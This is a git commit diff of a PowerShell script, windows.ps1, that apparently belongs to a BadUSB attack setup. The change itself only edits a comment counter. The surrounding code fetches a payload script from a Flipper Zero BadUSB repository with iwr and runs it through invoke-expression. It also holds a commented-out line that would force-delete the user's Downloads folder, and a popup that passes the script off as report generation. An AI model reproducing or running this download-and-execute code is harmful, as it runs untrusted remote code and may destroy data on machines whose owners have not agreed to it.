27e194c0b6534794e098731af7629e34debd914c
Miguel Santos <miguelsantos029@gmail.com>
2025-08-22 01:16:35 +0100

    Update windows.ps1

--- windows.ps1
+++ windows.ps1
@@ -1,6 +1,7 @@
-#2
+#4
 #$wshell = New-Object -ComObject Wscript.Shell
 #$wshell.Popup("The report generation script is executed!d")
 #Remove-Item -Path "$env:USERPROFILE\Downloads\*" -Recurse -Force
 $pl = iwr "https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-Wallpaper-Troll/Wallpaper-Troll.ps1?dl=1"; invoke-expression $pl
 exit
+
